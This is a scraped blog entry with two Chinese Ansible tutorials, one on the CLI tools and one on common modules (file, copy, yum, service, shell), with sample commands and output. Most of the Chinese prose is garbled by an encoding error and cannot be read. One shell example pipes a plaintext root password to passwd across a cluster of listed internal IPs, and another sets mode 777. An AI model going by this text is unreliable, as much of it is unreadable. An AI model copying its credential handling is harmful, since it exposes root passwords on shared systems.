1234567ansibleansible-docansible-galaxyansible-lintansible-playbookansible-pullansible-vault è¿™é‡Œæˆ‘ä»¬åªæŸ¥çœ‹usageéƒ¨åˆ†ï¼Œè¯¦ç»†éƒ¨åˆ†å¯ä»¥é€šè¿‡ â€œæŒ‡ä»¤ -hâ€ çš„æ–¹å¼è·å–ã€‚ 1ã€ansible123456789101112131415161718192021222324252627282930313233343536373839404142[root@docker ~]# ansible -hUsage: ansible &lt;host-pattern&gt; [options]å‚æ•°ï¼š -a 'Arguments', --args='Arguments' å‘½ä»¤è¡Œå‚æ•° -m NAME, --module-name=NAME æ‰§è¡Œæ¨¡å—çš„åå­—ï¼Œé»˜è®¤ä½¿ç”¨ command æ¨¡å—ï¼Œæ‰€ä»¥å¦‚æœæ˜¯åªæ‰§è¡Œå•ä¸€å‘½ä»¤å¯ä»¥ä¸ç”¨ -må‚æ•° -i PATH, --inventory=PATH æŒ‡å®šåº“å­˜ä¸»æœºæ–‡ä»¶çš„è·¯å¾„,é»˜è®¤ä¸º/etc/ansible/hosts. -u Usernameï¼Œ --user=Username æ‰§è¡Œç”¨æˆ·ï¼Œä½¿ç”¨è¿™ä¸ªè¿œç¨‹ç”¨æˆ·åè€Œä¸æ˜¯å½“å‰ç”¨æˆ· -U --sud-user=SUDO_User sudoåˆ°å“ªä¸ªç”¨æˆ·ï¼Œé»˜è®¤ä¸º root -k --ask-pass ç™»å½•å¯†ç ï¼Œæç¤ºè¾“å…¥SSHå¯†ç è€Œä¸æ˜¯å‡è®¾åŸºäºå¯†é’¥çš„éªŒè¯ -K --ask-sudo-pass æç¤ºå¯†ç ä½¿ç”¨sudo -s --sudo sudoè¿è¡Œ -S --su ç”¨ su å‘½ä»¤ -l --list æ˜¾ç¤ºæ‰€æ”¯æŒçš„æ‰€æœ‰æ¨¡å— -s --snippet æŒ‡å®šæ¨¡å—æ˜¾ç¤ºå‰§æœ¬ç‰‡æ®µ -f --forks=NUM å¹¶è¡Œä»»åŠ¡æ•°ã€‚NUMè¢«æŒ‡å®šä¸ºä¸€ä¸ªæ•´æ•°,é»˜è®¤æ˜¯5ã€‚ #ansible testhosts -a \"/sbin/reboot\" -f 10 é‡å¯testhostsç»„çš„æ‰€æœ‰æœºå™¨ï¼Œæ¯æ¬¡é‡å¯10å° --private-key=PRIVATE_KEY_FILE ç§é’¥è·¯å¾„ï¼Œä½¿ç”¨è¿™ä¸ªæ–‡ä»¶æ¥éªŒè¯è¿æ¥ -v --verbose è¯¦ç»†ä¿¡æ¯ all é’ˆå¯¹hosts å®šä¹‰çš„æ‰€æœ‰ä¸»æœºæ‰§è¡Œ -M MODULE_PATH, --module-path=MODULE_PATH è¦æ‰§è¡Œçš„æ¨¡å—çš„è·¯å¾„ï¼Œé»˜è®¤ä¸º/usr/share/ansible/ --list-hosts åªæ‰“å°æœ‰å“ªäº›ä¸»æœºä¼šæ‰§è¡Œè¿™ä¸ª playbook æ–‡ä»¶ï¼Œä¸æ˜¯å®é™…æ‰§è¡Œè¯¥ playbook æ–‡ä»¶ -o --one-line å‹ç¼©è¾“å‡ºï¼Œæ‘˜è¦è¾“å‡º.å°è¯•ä¸€åˆ‡éƒ½åœ¨ä¸€è¡Œä¸Šè¾“å‡ºã€‚ -t Directory, --tree=Directory å°†å†…å®¹ä¿å­˜åœ¨è¯¥è¾“å‡ºç›®å½•,ç»“æœä¿å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­åœ¨æ¯å°ä¸»æœºä¸Šã€‚ -B åå°è¿è¡Œè¶…æ—¶æ—¶é—´ -P è°ƒæŸ¥åå°ç¨‹åºæ—¶é—´ -T Seconds, --timeout=Seconds æ—¶é—´ï¼Œå•ä½ç§’s -P NUM, --poll=NUM è°ƒæŸ¥èƒŒæ™¯å·¥ä½œæ¯éš”æ•°ç§’ã€‚éœ€è¦- b -c Connection, --connection=Connection è¿æ¥ç±»å‹ä½¿ç”¨ã€‚å¯èƒ½çš„é€‰é¡¹æ˜¯paramiko(SSH),SSHå’Œåœ°æ–¹ã€‚å½“åœ°ä¸»è¦æ˜¯ç”¨äºcrontabæˆ–å¯åŠ¨ã€‚ --tags=TAGS åªæ‰§è¡ŒæŒ‡å®šæ ‡ç­¾çš„ä»»åŠ¡ ä¾‹å­:ansible-playbook test.yml --tags=copy åªæ‰§è¡Œæ ‡ç­¾ä¸ºcopyçš„é‚£ä¸ªä»»åŠ¡ --list-hosts åªæ‰“å°æœ‰å“ªäº›ä¸»æœºä¼šæ‰§è¡Œè¿™ä¸ª playbook æ–‡ä»¶ï¼Œä¸æ˜¯å®é™…æ‰§è¡Œè¯¥ playbook æ–‡ä»¶ --list-tasks åˆ—å‡ºæ‰€æœ‰å°†è¢«æ‰§è¡Œçš„ä»»åŠ¡ -C, --check åªæ˜¯æµ‹è¯•ä¸€ä¸‹ä¼šæ”¹å˜ä»€ä¹ˆå†…å®¹ï¼Œä¸ä¼šçœŸæ­£å»æ‰§è¡Œ;ç›¸å,è¯•å›¾é¢„æµ‹ä¸€äº›å¯èƒ½å‘ç”Ÿçš„å˜åŒ– --syntax-check æ‰§è¡Œè¯­æ³•æ£€æŸ¥çš„å‰§æœ¬,ä½†ä¸æ‰§è¡Œå®ƒ -l SUBSET, --limit=SUBSET è¿›ä¸€æ­¥é™åˆ¶æ‰€é€‰ä¸»æœº/ç»„æ¨¡å¼ --limit=192.168.0.15 åªå¯¹è¿™ä¸ªipæ‰§è¡Œ --skip-tags=SKIP_TAGS åªè¿è¡Œæˆå‰§å’Œä»»åŠ¡ä¸åŒ¹é…è¿™äº›å€¼çš„æ ‡ç­¾ --skip-tags=copy_start -e EXTRA_VARS, --extra-vars=EXTRA_VARS é¢å¤–çš„å˜é‡è®¾ç½®ä¸ºé”®=å€¼æˆ–YAML / JSON #cat update.yml --- - hosts: &#123;&#123; hosts &#125;&#125; remote_user: &#123;&#123; user &#125;&#125; .............. #ansible-playbook update.yml --extra-vars \"hosts=vipers user=admin\" ä¼ é€’&#123;&#123;hosts&#125;&#125;ã€&#123;&#123;user&#125;&#125;å˜é‡,hostså¯ä»¥æ˜¯ ipæˆ–ç»„å -l,--limit å¯¹æŒ‡å®šçš„ ä¸»æœº/ç»„ æ‰§è¡Œä»»åŠ¡ --limit=192.168.0.10ï¼Œ192.168.0.11 æˆ– -l 192.168.0.10ï¼Œ192.168.0.11 åªå¯¹è¿™ä¸ª2ä¸ªipæ‰§è¡Œä»»åŠ¡ 2ã€ansible-doc123456789101112[root@docker ~]# ansible-doc -hUsage: ansible-doc [options] [module...]Options: -h, --help show this help message and exit -l, --list List available modules -M MODULE_PATH, --module-path=MODULE_PATH specify path(s) to module library (default=None) -s, --snippet Show playbook snippet for specified module(s) -v, --verbose verbose mode (-vvv for more, -vvvv to enable connection debugging) --version show program's version number and exit è¯¥æŒ‡ä»¤ç”¨äºæŸ¥çœ‹æ¨¡å—ä¿¡æ¯ï¼Œå¸¸ç”¨å‚æ•°æœ‰ä¸¤ä¸ª-l å’Œ -s ï¼Œå…·ä½“å¦‚ä¸‹ï¼š 1234//åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…çš„æ¨¡å—# ansible-doc -l//æŸ¥çœ‹å…·ä½“æŸæ¨¡å—çš„ç”¨æ³•ï¼Œè¿™é‡Œå¦‚æŸ¥çœ‹commandæ¨¡å—# ansible-doc -s command 3ã€ansible-galaxy12345678[root@docker ~]# ansible-galaxy -hUsage: ansible-galaxy [delete|import|info|init|install|list|login|remove|search|setup] [--help] [options] ...Options: -h, --help show this help message and exit -v, --verbose verbose mode (-vvv for more, -vvvv to enable connection debugging) --version show program's version number and exit ansible-galaxy æŒ‡ä»¤ç”¨äºæ–¹ä¾¿çš„ä»https://galaxy.ansible.com/ ç«™ç‚¹ä¸‹è½½ç¬¬ä¸‰æ–¹æ‰©å±•æ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥å½¢è±¡çš„ç†è§£å…¶ç±»ä¼¼äºcentosä¸‹çš„yumã€pythonä¸‹çš„pipæˆ–easy_install ã€‚å¦‚ä¸‹ç¤ºä¾‹ï¼š 12345[root@localhost ~]# ansible-galaxy install aeriscloud.docker- downloading role 'docker', owned by aeriscloud- downloading role from https://github.com/AerisCloud/ansible-docker/archive/v1.0.0.tar.gz- extracting aeriscloud.docker to /etc/ansible/roles/aeriscloud.docker- aeriscloud.docker was installed successfully è¿™ä¸ªå®‰è£…äº†ä¸€ä¸ªaeriscloud.dockerç»„ä»¶ï¼Œå‰é¢aeriscloudæ˜¯galaxyä¸Šåˆ›å»ºè¯¥æ¨¡å—çš„ç”¨æˆ·åï¼Œåé¢å¯¹åº”çš„æ˜¯å…¶æ¨¡å—ã€‚åœ¨å®é™…åº”ç”¨ä¸­ä¹Ÿå¯ä»¥æŒ‡å®štxtæˆ–yml æ–‡ä»¶è¿›è¡Œå¤šä¸ªç»„ä»¶çš„ä¸‹è½½å®‰è£…ã€‚è¿™éƒ¨åˆ†å¯ä»¥å‚çœ‹å®˜æ–¹æ–‡æ¡£ã€‚ è¿™ä¸ªå®‰è£…äº†ä¸€ä¸ªaeriscloud.dockerç»„ä»¶ï¼Œå‰é¢aeriscloudæ˜¯galaxyä¸Šåˆ›å»ºè¯¥æ¨¡å—çš„ç”¨æˆ·åï¼Œåé¢å¯¹åº”çš„æ˜¯å…¶æ¨¡å—ã€‚åœ¨å®é™…åº”ç”¨ä¸­ä¹Ÿå¯ä»¥æŒ‡å®štxtæˆ–yml æ–‡ä»¶è¿›è¡Œå¤šä¸ªç»„ä»¶çš„ä¸‹è½½å®‰è£…ã€‚è¿™éƒ¨åˆ†å¯ä»¥å‚çœ‹å®˜æ–¹æ–‡æ¡£ã€‚ 4ã€ansible-lintansible-lintæ˜¯å¯¹playbookçš„è¯­æ³•è¿›è¡Œæ£€æŸ¥çš„ä¸€ä¸ªå·¥å…·ã€‚ç”¨æ³•æ˜¯ansible-lint playbook.yml ã€‚ 5ã€ansible-playbookè¯¥æŒ‡ä»¤æ˜¯ä½¿ç”¨æœ€å¤šçš„æŒ‡ä»¤ï¼Œå…¶é€šè¿‡è¯»å–playbook æ–‡ä»¶åï¼Œæ‰§è¡Œç›¸åº”çš„åŠ¨ä½œï¼Œè¿™ä¸ªåé¢ä¼šåšä¸ºä¸€ä¸ªé‡ç‚¹æ¥è®²ã€‚ 6ã€ansible-pullè¯¥æŒ‡ä»¤ä½¿ç”¨éœ€è¦è°ˆåˆ°ansibleçš„å¦ä¸€ç§æ¨¡å¼ï¼ï¼ï¼pull æ¨¡å¼ï¼Œè¿™å’Œæˆ‘ä»¬å¹³å¸¸ç»å¸¸ç”¨çš„pushæ¨¡å¼åˆšå¥½ç›¸åï¼Œå…¶é€‚ç”¨äºä»¥ä¸‹åœºæ™¯ï¼šä½ æœ‰æ•°é‡å·¨å¤§çš„æœºå™¨éœ€è¦é…ç½®ï¼Œå³ä½¿ä½¿ç”¨éå¸¸é«˜çš„çº¿ç¨‹è¿˜æ˜¯è¦èŠ±è´¹å¾ˆå¤šæ—¶é—´ï¼›ä½ è¦åœ¨ä¸€ä¸ªæ²¡æœ‰ç½‘ç»œè¿æ¥çš„æœºå™¨ä¸Šè¿è¡ŒAnisbleï¼Œæ¯”å¦‚åœ¨å¯åŠ¨ä¹‹åå®‰è£…ã€‚è¿™éƒ¨åˆ†ä¹Ÿä¼šå•ç‹¬åšä¸€èŠ‚æ¥è®²ã€‚ 7ã€ansible-vaultansible-vaultä¸»è¦åº”ç”¨äºé…ç½®æ–‡ä»¶ä¸­å«æœ‰æ•æ„Ÿä¿¡æ¯ï¼Œåˆä¸å¸Œæœ›ä»–èƒ½è¢«äººçœ‹åˆ°ï¼Œvaultå¯ä»¥å¸®ä½ åŠ å¯†/è§£å¯†è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œå±é«˜çº§ç”¨æ³•ã€‚ä¸»è¦å¯¹äºplaybooksé‡Œæ¯”å¦‚æ¶‰åŠåˆ°é…ç½®å¯†ç æˆ–å…¶ä»–å˜é‡æ—¶ï¼Œå¯ä»¥é€šè¿‡è¯¥æŒ‡ä»¤åŠ å¯†ï¼Œè¿™æ ·æˆ‘ä»¬é€šè¿‡catçœ‹åˆ°çš„ä¼šæ˜¯ä¸€ä¸ªå¯†ç ä¸²ç±»çš„æ–‡ä»¶ï¼Œç¼–è¾‘çš„æ—¶å€™éœ€è¦è¾“å…¥äº‹å…ˆè®¾å®šçš„å¯†ç æ‰èƒ½æ‰“å¼€ã€‚è¿™ç§playbookæ–‡ä»¶åœ¨æ‰§è¡Œæ—¶ï¼Œéœ€è¦åŠ ä¸Š â€“ask-vault-passå‚æ•°ï¼ŒåŒæ ·éœ€è¦è¾“å…¥å¯†ç åæ‰èƒ½æ­£å¸¸æ‰§è¡Œã€‚å…·ä½“è¯¥éƒ¨åˆ†å¯ä»¥å‚æŸ¥å®˜æ–¹åšå®¢ã€‚ æ³¨ï¼šä¸Šé¢ä¸ƒä¸ªæŒ‡ä»¤ï¼Œç”¨çš„æœ€å¤šçš„åªæœ‰ä¸¤ä¸ªansible å’Œansible-playbook ï¼Œè¿™ä¸¤ä¸ªä¸€å®šè¦æŒæ¡ï¼Œå…¶ä»–äº”ä¸ªå±äºæ‹“å±•æˆ–é«˜çº§éƒ¨åˆ†ã€‚","link":"/2016/03/07/è‡ªåŠ¨åŒ–+Jenkins/Ansible/ansibleå°ç»“ï¼ˆäºŒï¼‰ansibleæ¶æ„ /"},{"title":"Ansibleå°ç»“ (äº”) å¸¸ç”¨æ¨¡å—","text":"ansibleå‘½ä»¤æ€»ç»“ä½¿ç”¨ï¼šåœ¨ä¸Šä¸€ç¯‡ä¸­ä»‹ç»äº†commandséƒ¨åˆ†æ¨¡å—ï¼Œæœ¬ç¯‡æ‰¿æ¥ä¸Šç¯‡ä»‹ç»ä¸‹å¸¸ç”¨çš„æ¨¡å—ã€‚æ ¹æ®å®˜æ–¹çš„åˆ†ç±»ï¼Œå°†æ¨¡å—æŒ‰åŠŸèƒ½åˆ†ç±»ä¸ºï¼š 1äº‘æ¨¡å—ã€å‘½ä»¤æ¨¡å—ã€æ•°æ®åº“æ¨¡å—ã€æ–‡ä»¶æ¨¡å—ã€èµ„äº§æ¨¡å—ã€æ¶ˆæ¯æ¨¡å—ã€ç›‘æ§æ¨¡å—ã€ç½‘ç»œæ¨¡å—ã€é€šçŸ¥æ¨¡å—ã€åŒ…ç®¡ç†æ¨¡å—ã€æºç æ§åˆ¶æ¨¡å—ã€ç³»ç»Ÿæ¨¡å—ã€å•å…ƒæ¨¡å—ã€webè®¾æ–½æ¨¡å—ã€windowsæ¨¡å— å…·ä½“å¯ä»¥å‚çœ‹å®˜æ–¹é¡µé¢ è¿™é‡Œä»å®˜æ–¹åˆ†ç±»çš„æ¨¡å—é‡Œé€‰æ‹©æœ€å¸¸ç”¨çš„ä¸€äº›æ¨¡å—è¿›è¡Œä»‹ç»ï¼ˆcommandsæ¨¡å—ä¸Šä¸€ç¯‡å·²ç»ä»‹ç»ï¼Œè¿™é‡Œä¸å†æï¼‰ã€‚ ä¸€ã€pingæ¨¡å—æµ‹è¯•ä¸»æœºæ˜¯å¦æ˜¯é€šçš„ï¼Œç”¨æ³•å¾ˆç®€å•ï¼Œä¸æ¶‰åŠå‚æ•°ï¼š1234567ansible tomcat_B1 -m ping[root@ansible ~]# ansible tomcat_C1 -m ping192.168.1.177 | SUCCESS =&gt; &#123; \"changed\": false, \"ping\": \"pong\"&#125; äºŒã€setupæ¨¡å—setupæ¨¡å—ï¼Œä¸»è¦ç”¨äºè·å–ä¸»æœºä¿¡æ¯ï¼Œåœ¨playbooksé‡Œç»å¸¸ä¼šç”¨åˆ°çš„ä¸€ä¸ªå‚æ•°gather_factså°±ä¸è¯¥æ¨¡å—ç›¸å…³ã€‚setupæ¨¡å—ä¸‹ç»å¸¸ä½¿ç”¨çš„ä¸€ä¸ªå‚æ•°æ˜¯filterå‚æ•°ï¼Œå…·ä½“ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼ˆç”±äºè¾“å‡ºç»“æœè¾ƒå¤šï¼Œè¿™é‡Œåªåˆ—å‘½ä»¤ä¸å†™ç»“æœï¼‰ï¼š æŸ¥çœ‹ä¸»æœºå†…å­˜ä¿¡æ¯1[root@ansible ~]# ansible tomcat_C1 -m setup -a 'filter=ansible_*_mb' æŸ¥çœ‹åœ°æ¥å£ä¸ºeth0-2çš„ç½‘å¡ä¿¡æ¯12[root@ansible ~]# ansible tomcat_C1 -m setup -a 'filter=ansible_eth[0-2]' [root@ansible ~]# ansible all -m setup --tree /tmp/facts //å°†æ‰€æœ‰ä¸»æœºçš„ä¿¡æ¯è¾“å…¥åˆ°/tmp/factsç›®å½•ä¸‹ï¼Œæ¯å°ä¸»æœºçš„ä¿¡æ¯è¾“å…¥åˆ°ä¸»æœºåæ–‡ä»¶ä¸­ï¼ˆ/etc/ansible/hostsé‡Œçš„ä¸»æœºåï¼‰ ä¸‰ã€fileæ¨¡å—fileæ¨¡å—ä¸»è¦ç”¨äºè¿œç¨‹ä¸»æœºä¸Šçš„æ–‡ä»¶æ“ä½œï¼Œfileæ¨¡å—åŒ…å«å¦‚ä¸‹é€‰é¡¹ï¼š forceï¼šéœ€è¦åœ¨ä¸¤ç§æƒ…å†µä¸‹å¼ºåˆ¶åˆ›å»ºè½¯é“¾æ¥ï¼Œä¸€ç§æ˜¯æºæ–‡ä»¶ä¸å­˜åœ¨ä½†ä¹‹åä¼šå»ºç«‹çš„æƒ…å†µä¸‹ï¼›å¦ä¸€ç§æ˜¯ç›®æ ‡è½¯é“¾æ¥å·²å­˜åœ¨,éœ€è¦å…ˆå–æ¶ˆä¹‹å‰çš„è½¯é“¾ï¼Œç„¶ååˆ›å»ºæ–°çš„è½¯é“¾ï¼Œæœ‰ä¸¤ä¸ªé€‰é¡¹ï¼šyes|no groupï¼šå®šä¹‰æ–‡ä»¶/ç›®å½•çš„å±ç»„ modeï¼šå®šä¹‰æ–‡ä»¶/ç›®å½•çš„æƒé™ ownerï¼šå®šä¹‰æ–‡ä»¶/ç›®å½•çš„å±ä¸» pathï¼šå¿…é€‰é¡¹ï¼Œå®šä¹‰æ–‡ä»¶/ç›®å½•çš„è·¯å¾„ recurseï¼šé€’å½’çš„è®¾ç½®æ–‡ä»¶çš„å±æ€§ï¼Œåªå¯¹ç›®å½•æœ‰æ•ˆ srcï¼šè¦è¢«é“¾æ¥çš„æºæ–‡ä»¶çš„è·¯å¾„ï¼Œåªåº”ç”¨äºstate=linkçš„æƒ…å†µ destï¼šè¢«é“¾æ¥åˆ°çš„è·¯å¾„ï¼Œåªåº”ç”¨äºstate=linkçš„æƒ…å†µ stateï¼š directoryï¼šå¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œåˆ›å»ºç›®å½• fileï¼šå³ä½¿æ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¹Ÿä¸ä¼šè¢«åˆ›å»º linkï¼šåˆ›å»ºè½¯é“¾æ¥ hardï¼šåˆ›å»ºç¡¬é“¾æ¥ touchï¼šå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶æˆ–ç›®å½•å·²å­˜åœ¨ï¼Œåˆ™æ›´æ–°å…¶æœ€åä¿®æ”¹æ—¶é—´ absentï¼šåˆ é™¤ç›®å½•ã€æ–‡ä»¶æˆ–è€…å–æ¶ˆé“¾æ¥æ–‡ä»¶ä½¿ç”¨ç¤ºä¾‹ï¼š 1234ansible test -m file -a \"src=/etc/fstab dest=/tmp/fstab state=link\"ansible test -m file -a \"path=/tmp/fstab state=absent\"ansible test -m file -a \"path=/tmp/test state=touch\"ansible test -m file -a \"path=/tmp/test state=directory\" ansible test -m file -a \"path=/tmp/testd state=directory owner=root group=root mode=777\" å››ã€copyæ¨¡å—å¤åˆ¶æ–‡ä»¶åˆ°è¿œç¨‹ä¸»æœºï¼Œcopyæ¨¡å—åŒ…å«å¦‚ä¸‹é€‰é¡¹ï¼š backupï¼šåœ¨è¦†ç›–ä¹‹å‰å°†åŸæ–‡ä»¶å¤‡ä»½ï¼Œå¤‡ä»½æ–‡ä»¶åŒ…å«æ—¶é—´ä¿¡æ¯ã€‚æœ‰ä¸¤ä¸ªé€‰é¡¹ï¼šyes|no contentï¼šç”¨äºæ›¿ä»£â€srcâ€,å¯ä»¥ç›´æ¥è®¾å®šæŒ‡å®šæ–‡ä»¶çš„å€¼ destï¼šå¿…é€‰é¡¹ã€‚è¦å°†æºæ–‡ä»¶å¤åˆ¶åˆ°çš„è¿œç¨‹ä¸»æœºçš„ç»å¯¹è·¯å¾„ï¼Œå¦‚æœæºæ–‡ä»¶æ˜¯ä¸€ä¸ªç›®å½•ï¼Œé‚£ä¹ˆè¯¥è·¯å¾„ä¹Ÿå¿…é¡»æ˜¯ä¸ªç›®å½• directory_modeï¼šé€’å½’çš„è®¾å®šç›®å½•çš„æƒé™ï¼Œé»˜è®¤ä¸ºç³»ç»Ÿé»˜è®¤æƒé™ forceï¼šå¦‚æœç›®æ ‡ä¸»æœºåŒ…å«è¯¥æ–‡ä»¶ï¼Œä½†å†…å®¹ä¸åŒï¼Œå¦‚æœè®¾ç½®ä¸ºyesï¼Œåˆ™å¼ºåˆ¶è¦†ç›–ï¼Œå¦‚æœä¸ºnoï¼Œåˆ™åªæœ‰å½“ç›®æ ‡ä¸»æœºçš„ç›®æ ‡ä½ç½®ä¸å­˜åœ¨è¯¥æ–‡ä»¶æ—¶ï¼Œæ‰å¤åˆ¶ã€‚é»˜è®¤ä¸ºyes othersï¼šæ‰€æœ‰çš„fileæ¨¡å—é‡Œçš„é€‰é¡¹éƒ½å¯ä»¥åœ¨è¿™é‡Œä½¿ç”¨ srcï¼šè¦å¤åˆ¶åˆ°è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶åœ¨æœ¬åœ°çš„åœ°å€ï¼Œå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹è·¯å¾„ã€‚å¦‚æœè·¯å¾„æ˜¯ä¸€ä¸ªç›®å½•ï¼Œå®ƒå°†é€’å½’å¤åˆ¶ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœè·¯å¾„ä½¿ç”¨â€/â€œæ¥ç»“å°¾ï¼Œåˆ™åªå¤åˆ¶ç›®å½•é‡Œçš„å†…å®¹ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨â€/â€œæ¥ç»“å°¾ï¼Œåˆ™åŒ…å«ç›®å½•åœ¨å†…çš„æ•´ä¸ªå†…å®¹å…¨éƒ¨å¤åˆ¶ï¼Œç±»ä¼¼äºrsyncã€‚ validateï¼šThe validation command to run before copying into place. The path to the file to validate is passed in via â€˜%sâ€™ which must be present as in the visudo example below. ç¤ºä¾‹å¦‚ä¸‹ï¼š 123ansible test -m copy -a \"src=/srv/myfiles/foo.conf dest=/etc/foo.conf owner=foo group=foo mode=0644\"ansible test -m copy -a \"src=/mine/ntp.conf dest=/etc/ntp.conf owner=root group=root mode=644 backup=yes\"ansible test -m copy -a \"src=/mine/sudoers dest=/etc/sudoers validate='visudo -cf %s'\" è¿™é‡Œåœ¨ä¸¾ä¸ªä¾‹å­ï¼š ç›®çš„ï¼šæŠŠä¸»æ§ç«¯/opt/ç›®å½•ä¸‹é¢logstash.tar.gzæ–‡ä»¶æ‹·è´åˆ°åˆ°æŒ‡å®šèŠ‚ç‚¹ä¸Š/srv/ä¸‹é¢ å‘½ä»¤ï¼šansible cluster1:children -m copy -a &quot;src=/opt/logstash.tar.gz dest=/srv/. owner=root group=root mode=644&quot; 12345678910111213141516171819202122232425262728root@salt ~]# ansible cluster1:children -m copy -a \"src=/opt/logstash.tar.gz dest=/srv/. 10.47.59.190 | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"9d15ea324f39d08cb379f59ffee9fa7ad2a62ab8\", \"dest\": \"/srv/./logstash.tar.gz\", \"gid\": 0, \"group\": \"root\", \"md5sum\": \"c151602e79a336ca363928dea68d2567\", \"mode\": \"0644\", \"owner\": \"root\", \"size\": 84431108, \"src\": \"/root/.ansible/tmp/ansible-tmp-1483939085.93-201327709717575/source\", \"state\": \"file\", \"uid\": 0&#125;10.47.106.105 | SUCCESS =&gt; &#123; \"changed\": true, \"checksum\": \"9d15ea324f39d08cb379f59ffee9fa7ad2a62ab8\", \"dest\": \"/srv/./logstash.tar.gz\", \"gid\": 0, \"group\": \"root\", \"md5sum\": \"c151602e79a336ca363928dea68d2567\", \"mode\": \"0644\", \"owner\": \"root\", \"size\": 84431108, \"src\": \"/root/.ansible/tmp/ansible-tmp-1483939088.11-46151538408374/source\", \"state\": \"file\", \"uid\": 0&#125; æ‰¹é‡æ§åˆ¶è§£å‹æ–‡ä»¶æ‰¹é‡è§£å‹å‘½ä»¤ï¼š ansible cluster1:children -m shell -a &quot;tar -zxvf /srv/logstash.tar.gz&quot; -C /srv/. äº”ã€yumæ¨¡å—yumå®‰è£…ä½¿ç”¨ï¼šä½¿ç”¨yumåŒ…ç®¡ç†å™¨æ¥ç®¡ç†è½¯ä»¶åŒ…ï¼Œå…¶é€‰é¡¹æœ‰ï¼š config_fileï¼šyumçš„é…ç½®æ–‡ä»¶ disable_gpg_checkï¼šå…³é—­gpg_check disablerepoï¼šä¸å¯ç”¨æŸä¸ªæº enablerepoï¼šå¯ç”¨æŸä¸ªæº nameï¼šè¦è¿›è¡Œæ“ä½œçš„è½¯ä»¶åŒ…çš„åå­—ï¼Œä¹Ÿå¯ä»¥ä¼ é€’ä¸€ä¸ªurlæˆ–è€…ä¸€ä¸ªæœ¬åœ°çš„rpmåŒ…çš„è·¯å¾„stateï¼šçŠ¶æ€ï¼ˆpresentï¼Œabsentï¼Œlatestï¼‰ ç¤ºä¾‹å¦‚ä¸‹ï¼š 1ansible tomcat_D1 -s -m yum -a \"name=wget state=latest\" 12345678910111213141516[root@ansible playbook]# ansible tomcat_D1 -s -C -m yum -a \"name=kernel state=latest\"192.168.1.178 | SUCCESS =&gt; &#123; \"changed\": true, \"changes\": &#123; \"installed\": [], \"updated\": [ [ \"kernel\", \"2.6.32-642.4.2.el6.x86_64 from updates\" ] ] &#125;, \"msg\": \"\", \"rc\": 0, \"results\": []&#125; å…­ serviceæ¨¡å—ç”¨äºç®¡ç†æœåŠ¡ è¯¥æ¨¡å—åŒ…å«å¦‚ä¸‹é€‰é¡¹ï¼š argumentsï¼šç»™å‘½ä»¤è¡Œæä¾›ä¸€äº›é€‰é¡¹ enabledï¼šæ˜¯å¦å¼€æœºå¯åŠ¨ yes|no nameï¼šå¿…é€‰é¡¹ï¼ŒæœåŠ¡åç§° patternï¼šå®šä¹‰ä¸€ä¸ªæ¨¡å¼ï¼Œå¦‚æœé€šè¿‡statusæŒ‡ä»¤æ¥æŸ¥çœ‹æœåŠ¡çš„çŠ¶æ€æ—¶ï¼Œæ²¡æœ‰å“åº”ï¼Œå°±ä¼šé€šè¿‡psæŒ‡ä»¤åœ¨è¿›ç¨‹ä¸­æ ¹æ®è¯¥æ¨¡å¼è¿›è¡ŒæŸ¥æ‰¾ï¼Œå¦‚æœåŒ¹é…åˆ°ï¼Œåˆ™è®¤ä¸ºè¯¥æœåŠ¡ä¾ç„¶åœ¨è¿è¡Œ runlevelï¼šè¿è¡Œçº§åˆ« sleepï¼šå¦‚æœæ‰§è¡Œäº†restartedï¼Œåœ¨åˆ™stopå’Œstartä¹‹é—´æ²‰ç¡å‡ ç§’é’Ÿ stateï¼šå¯¹å½“å‰æœåŠ¡æ‰§è¡Œå¯åŠ¨ï¼Œåœæ­¢ã€é‡å¯ã€é‡æ–°åŠ è½½ç­‰æ“ä½œï¼ˆstarted,stopped,restarted,reloadedï¼‰ ç¤ºä¾‹å¦‚ä¸‹ï¼š 1234ansible test -m service -a \"name=httpd state=started enabled=yes\" ansible test -m service -a \"name=foo pattern=/usr/bin/foo state=started\" ansible test -m service -a \"name=network state=restarted args=eth0\"ansible cluster2:children -m service -a \"name=logstash pattern=/etc/init.d/logstash state=started\" å‚è€ƒï¼šhttp://www.361way.com/ansible-modules/4415.html ä¸ƒ shell æ¨¡å—è¿™é‡Œæˆ‘å†™ä¸ªä¾‹å­ï¼š æ‰¹é‡æ›´æ”¹ç»„çš„æœºå™¨çš„ç”¨æˆ·åå¯†ç ã€‚ 12345678910111213141516[root@salt ansible]# ansible cluster1:children -m shell -a \"echo \"Ihaozhuo\" | passwd --stdin \"root\" \"10.43.59.190 | SUCCESS | rc=0 &gt;&gt;æ›´æ”¹ç”¨æˆ· root çš„å¯†ç  ã€‚passwdï¼š æ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚10.23.2.106 | SUCCESS | rc=0 &gt;&gt;æ›´æ”¹ç”¨æˆ· root çš„å¯†ç  ã€‚passwdï¼š æ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚10.23.232.85 | SUCCESS | rc=0 &gt;&gt;æ›´æ”¹ç”¨æˆ· root çš„å¯†ç  ã€‚passwdï¼š æ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚10.23.232.131 | SUCCESS | rc=0 &gt;&gt;æ›´æ”¹ç”¨æˆ· root çš„å¯†ç  ã€‚passwdï¼š 